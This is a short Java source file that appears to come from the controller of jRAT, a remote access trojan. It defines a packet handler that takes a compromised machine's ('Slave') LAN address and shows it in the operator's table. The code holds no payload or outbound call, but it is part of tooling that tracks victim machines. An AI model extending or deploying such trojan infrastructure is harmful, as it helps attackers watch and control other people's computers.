package pro.jrat.client.packets.incoming;

import java.io.DataInputStream;

import pro.jrat.client.Slave;
import pro.jrat.client.ui.frames.Frame;
import pro.jrat.client.utils.Utils;

public class Packet28InitLanAddress extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String raw = slave.readLine();
		slave.setLocalIP(raw);

		int row = Utils.getRow(slave);

		Frame.mainModel.setValueAt(raw, row, 8);
	}

}
